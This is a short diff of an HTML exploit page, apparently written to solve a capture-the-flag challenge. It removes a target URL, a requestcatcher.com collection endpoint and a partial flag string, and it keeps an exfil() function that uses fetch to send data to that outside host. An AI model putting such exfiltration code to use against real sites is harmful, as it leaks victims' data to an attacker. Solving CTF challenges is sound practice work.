@@ -1,8 +1,5 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
 // v12 - verify prefix then find remaining chars with lower threshold + retries
-var T="https://svfgp.breakable.live";
-var W="https://h32enj12.requestcatcher.com";
-var known="CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f0b";
 var HEX="0123456789abcdef";
 
 function exfil(d){fetch(W+"/"+encodeURIComponent(d),{mode:"no-cors"}).catch(function(){});}
